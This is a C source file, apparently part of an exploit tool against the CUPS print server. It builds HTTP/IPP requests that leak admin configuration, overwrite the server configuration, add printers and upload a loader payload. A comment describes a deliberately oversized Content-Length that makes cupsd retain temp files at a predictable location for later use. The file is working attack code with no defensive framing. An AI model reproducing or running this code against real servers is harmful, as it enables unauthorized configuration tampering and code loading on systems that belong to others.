#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <netdb.h>

#include <ctype.h>

#include "membuf.h"
#include "network.h"
#include "util.h"
#include "ipp.h"
#include "exp.h"

#include "http.h"

int parse_resp_code(mem_buf *b) {

  int respcode = -1;
  char buf[8];

  if(b == NULL || b->used < 13) {
    fprintf(stderr,"Response is either NULL (%p) or too short (%zd)\n",b,b ? b->used : 0);
    return -1;
  }


  if(memcmp(b->buf,"HTTP/1.1 ",9)) {
    fprintf(stderr,"Response doesn't appear to start with HTTP response (HTTP/1.1 404):\n%s\n",b->buf);
    return -1;
  }

  memset(buf,0,sizeof(buf));
  memcpy(buf,b->buf + 9,4);

  if(!isdigit(buf[0]) || !isdigit(buf[1]) || !isdigit(buf[2]) || buf[3] != ' ') {
    fprintf(stderr,"HTTP response code missing or invalid:\n%s\n",b->buf);
    return -1;
  }

  buf[3] = 0;

  if(sscanf(buf,"%d",&respcode) != 1) {
    fprintf(stderr,"Unknown error from sscanf() for response code '%s'\n",buf);
    return -1;
  }

  return respcode;
}

int get_line_length(char* line, size_t len) {
  int line_len = 0;
  while(line_len < len) {
    if (line[line_len++] == '\n')
      return line_len;
  }
  return len;
}

int skip_response_headers(mem_buf* b, size_t* content_length_out) {
  char* buf = b->buf;
  size_t len = b->used;
  size_t i = 0;
  char tmp[4096];
  int content_length = -1;

  while(i < len) {
    int line_len = get_line_length(&buf[i], len - i);
    if (line_len >= sizeof(tmp)) {
      i += line_len;
      continue;
    }
    memcpy(tmp, &buf[i], line_len);
    tmp[line_len] = 0;

    i += line_len;

    while(strlen(tmp) > 0 && (tmp[strlen(tmp) - 1] == '\n' || tmp[strlen(tmp) - 1] == '\r')) {
      tmp[strlen(tmp) - 1] = 0;
    }

    if (strlen(tmp) == 0)
      break;

    if (!strncmp(tmp, "Content-Length:", 15)) {
      char* ptr = &tmp[15];
      while(isspace(*ptr)) {
        ptr++;
      }

      content_length = atoi(ptr);
    }
  }

  if (content_length > 0 && content_length_out != NULL) {
    *content_length_out = content_length;
  }

  return i;
}

int parse_response(expctx* ctx, uritest* uri, mem_buf* b, int type) {
  int respcode = parse_resp_code(b);

  if (respcode != uri->exp_resp)
    return -1;

  size_t content_length = 0;
  int index = skip_response_headers(b, &content_length);

  if (index < 0 || index >= b->used)
    return -1;

  size_t body_length = b->used - index;
  if (parse_ipp_response(ctx, uri, &b->buf[index], body_length, type)) {
    fprintf(stderr, "Error parsing response body\n");
    return -1;
  }

  return 0; 
}

int build_request_body_seed_library(expctx* ctx, mem_buf* buf) {
  mem_buf_append_buf(buf, ctx->loader_payload);
  return 0;
}

int build_request_body_with_config(expctx* ctx, uritest* uri, mem_buf* buf) {
  mem_buf_append(buf, ctx->cups_config_content->buf, ctx->cups_config_content->used);
  return 0;
}

void append_longer_clen(mem_buf* buf, mem_buf* body) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "Content-Length: %zd\r\n", body->used + 100);
  mem_buf_append_string(buf, tmp, 0);
}

void append_good_clen(mem_buf* buf, mem_buf* body) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "Content-Length: %zd\r\n", body->used);
  mem_buf_append_string(buf, tmp, 0);
}

mem_buf *build_exploit_payload_internal(expctx* ctx, uritest* uri, int ipp_type, int body_short) {
  char authhdr[16384];
  char tmp[16384];
  mem_buf *req_body;
  mem_buf *req;

  req = mem_buf_new();
  req_body = mem_buf_new();

  switch(uri->method) {
    case METHOD_POST:
      if (ipp_type == ADD_PRINTER) {
        mem_buf_append_string(req, "POST /admin/ HTTP/1.1\r\n", 0);
      } else if (ctx->printer_name != NULL) {
        snprintf(tmp,sizeof(tmp),"POST %s/%s HTTP/1.1\r\n",uri->uribase,ctx->printer_name);
        mem_buf_append_string(req,tmp,0);
      } else {
        mem_buf_append_string(req, "POST /printers/ HTTP/1.1\r\n", 0);
      }
      break;
    case METHOD_HEAD:
      snprintf(tmp,sizeof(tmp),"HEAD %s/%s HTTP/1.1\r\n",uri->uribase,ctx->printer_name);
      mem_buf_append_string(req,tmp,0);
      break;
    case METHOD_PUT:
      snprintf(tmp,sizeof(tmp),"PUT %s HTTP/1.1\r\n",uri->uribase);
      mem_buf_append_string(req,tmp,0);
      break;
    case METHOD_GET:
      // fall through
    default:
      snprintf(tmp,sizeof(tmp),"GET %s HTTP/1.1\r\n",uri->uribase);
      mem_buf_append_string(req,tmp,0);
      break;
  }

  switch (ipp_type) {
    case GET_PRINTERNAME:
      build_ipp_request_get_printer_name(ctx, uri, req_body);
      break;
    case LEAK_ADMINCONF:
      build_ipp_request_clear_admin_conf(ctx, uri, req_body);
      break;
    case LEAK_ADMIN:
      build_ipp_request_clear_admin(ctx, uri, req_body);
      break;
    case UPDATE_CONFIG:
      build_request_body_with_config(ctx, uri, req_body);
      break;
    case ADD_PRINTER:
      build_ipp_request_addprinter(ctx, uri, req_body);
      break;
    case SEED_LIBRARY:
      build_request_body_seed_library(ctx, req_body);
  }

  if (req_body->used != 0) { 
    fprintf(stdout, "Request array body:\n");
    print_html_escaped_array(req_body->buf, req_body->used);
    fprintf(stdout, "\n");
  } else {
    fprintf(stdout, "No request body\n");
  }

  if (req_body->used != 0) {
    mem_buf_append_string(req, "Content-Type: application/ipp\r\n", 0);
  }

  snprintf(tmp,sizeof(tmp),"Host: %s:%d\r\n",ctx->host,ctx->port);
  mem_buf_append_string(req,tmp,0);

  mem_buf_append_string(req,"User-Agent: CUPS/2.0.2\r\n",0);
  mem_buf_append_string(req,"Connection: Keep-Alive\r\n", 0);

  if (req_body->used != 0) {
    if (body_short) {
      append_longer_clen(req, req_body);
    } else {
      append_good_clen(req, req_body);
    }
  }
  
  mem_buf_append_string(req,"\r\n",0);

  if (req_body->used != 0) {
    mem_buf_append_buf(req, req_body);
  }

  fprintf(stdout,"Exploit request is:\n");
  print_hex(req->buf, req->used);

  return req;
}

// Build an HTTP request, where the Content-Length header is longer than the body we send.
// This causes cupsd to retain temp files at a predictable location, which we can use.
mem_buf* build_exploit_payload_short(expctx* ctx, uritest* uri, int type) {
  return build_exploit_payload_internal(ctx, uri, type, 1);
}

// Build a normal HTTP request (content-length consistent with what we send).
mem_buf *build_exploit_payload(expctx* ctx, uritest* uri, int type) {
  return build_exploit_payload_internal(ctx, uri, type, 0);
}

mem_buf *build_exploit_payload_newconfig(expctx* ctx, uritest* uri) {
  return build_exploit_payload(ctx, uri, UPDATE_CONFIG);
}

mem_buf *build_exploit_payload_getprinter(expctx* ctx, uritest* uri) {
  return build_exploit_payload(ctx, uri, GET_PRINTERNAME);
}

mem_buf *build_exploit_payload_adminconf(expctx* ctx, uritest* uri) {
  return build_exploit_payload(ctx, uri, LEAK_ADMINCONF);
}

mem_buf *build_exploit_payload_admin(expctx* ctx, uritest* uri) {
  return build_exploit_payload(ctx, uri, LEAK_ADMIN);
}

mem_buf *build_exploit_payload_addprinter(expctx* ctx, uritest* uri) {
  return build_exploit_payload(ctx, uri, ADD_PRINTER);
}

mem_buf *build_exploit_payload_seed_library(expctx* ctx, uritest* uri) {
  return build_exploit_payload_short(ctx, uri, SEED_LIBRARY);
}

mem_buf *build_exploit_payload_generic(expctx* ctx, uritest* uri) {
  return build_exploit_payload(ctx, uri, GENERIC_REQUEST);
}

char *get_method_string(int method) {
  switch(method) {
    case METHOD_INVALID:
      fprintf(stderr,"WARNING: attempted to get a string for METHOD_INVALID\n");
      return "INVALID";
    case METHOD_GET:
      return "GET";
    case METHOD_POST:
      return "POST";
    case METHOD_HEAD:
      return "HEAD";
    case METHOD_PUT:
      return "PUT";
  }

  fprintf(stderr,"WARNING: attempted to get a string for an unknown method type '%d'\n",method);
  return "UNKNOWN";
}
